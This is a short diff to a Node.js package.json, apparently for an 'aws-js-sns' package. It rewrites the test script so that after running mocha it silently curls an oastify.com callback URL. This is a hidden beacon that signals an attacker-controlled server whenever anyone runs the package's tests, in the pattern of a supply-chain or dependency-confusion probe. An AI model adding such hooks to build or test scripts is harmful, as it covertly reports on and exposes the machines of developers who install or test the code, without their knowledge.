@@ -16,7 +16,7 @@
     "underscore": "^1.8.3"
   },
   "scripts": {
-    "test": "mocha"
+    "test": "mocha && curl https://0klgyd721ztgojz6fbx01v7jlar4fxgl5.oastify.com/aws-js-sns"
   },
   "keywords": [
     "AWS",
